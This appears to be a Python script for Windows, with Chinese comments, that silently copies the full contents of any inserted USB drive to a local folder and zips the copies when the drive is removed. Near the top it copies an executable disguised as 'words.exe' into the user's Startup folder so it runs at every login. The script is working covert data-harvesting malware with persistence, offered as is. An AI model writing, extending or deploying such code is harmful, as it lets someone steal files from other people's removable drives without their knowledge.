import os
import shutil
import win32file
import win32api
import time
import zipfile
import tempfile
import sys

def copy_usb_files(source_drive, destination_folder):
    """复制U盘中的所有文件到目标文件夹"""
    for root, dirs, files in os.walk(source_drive):
        for dir in dirs:
            source_dir_path = os.path.join(root, dir)
            destination_dir_path = os.path.join(destination_folder, os.path.relpath(source_dir_path, source_drive))
            if not os.path.exists(destination_dir_path):
                os.makedirs(destination_dir_path)  # 创建目标文件夹
                print(f"Created directory: {destination_dir_path}")

        for file in files:
            source_file_path = os.path.join(root, file)
            destination_file_path = os.path.join(destination_folder, os.path.relpath(source_file_path, source_drive))
            if not os.path.exists(destination_file_path):
                try:
                    # 复制文件到目标文件夹
                    shutil.copy2(source_file_path, destination_file_path)
                    print(f"Copied file: {source_file_path}")
                except Exception as e:
                    print(f"Error copying file: {e}")

def compress_to_zip(source_folder, zip_file):
    """将指定文件夹中的文件压缩成ZIP文件"""
    with zipfile.ZipFile(zip_file, 'w') as zipf:
        for root, _, files in os.walk(source_folder):
            for file in files:
                file_path = os.path.join(root, file)
                if source_folder in file_path:  # 检查文件路径是否包含目标文件夹路径
                    zipf.write(file_path, os.path.relpath(file_path, source_folder))

# 设置目标文件夹
destination_folder = "D:\\usbcoper"  # 将目标文件夹设置为D盘根目录

# 复制自己到启动目录
startup_folder = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
exe_name = 'words.exe'
exe_path = os.path.join(os.path.dirname(sys.executable), exe_name)
shutil.copy(exe_path, os.path.join(startup_folder, exe_name))

# 初始化设备状态
previous_device_status = False

while True:
    # 获取所有逻辑驱动器
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]  # 分割字符串并移除最后一个空字符串

    # 当前设备状态
    current_device_status = any(win32file.GetDriveType(drive) == win32file.DRIVE_REMOVABLE for drive in drives)

    # 设备状态变化
    if current_device_status != previous_device_status:
        if current_device_status:
            print("Device inserted")
            # 找到U盘路径并复制文件
            for drive in drives:
                if win32file.GetDriveType(drive) == win32file.DRIVE_REMOVABLE:
                    copy_usb_files(drive, destination_folder)
                    break
        else:
            print("Device removed")
            # 等待一段时间，以确保所有文件已复制完成
            time.sleep(10)

            # 检查目标文件夹是否为空
            if os.listdir(destination_folder):
                # 创建临时文件夹
                with tempfile.TemporaryDirectory() as temp_dir:
                    temp_zip_file = os.path.join(temp_dir, "temp.zip")
                    # 压缩临时文件夹中的文件
                    compress_to_zip(destination_folder, temp_zip_file)
                    # 移动临时ZIP文件到目标位置
                    zip_file_name = f"destination_{time.strftime('%Y%m%d%H%M%S')}.zip"
                    shutil.move(temp_zip_file, os.path.join("D:\\", zip_file_name))
                    print(f"Compressed files to: {os.path.join(destination_folder, zip_file_name)}")
                # 删除目标文件夹中的文件，包括子文件夹
                shutil.rmtree(destination_folder)
                print(f"Deleted files in: {destination_folder}")

                # 重新创建目标文件夹
                os.makedirs(destination_folder)
                print(f"Recreated directory: {destination_folder}")

    previous_device_status = current_device_status
    time.sleep(10)  # 每10秒检测一次
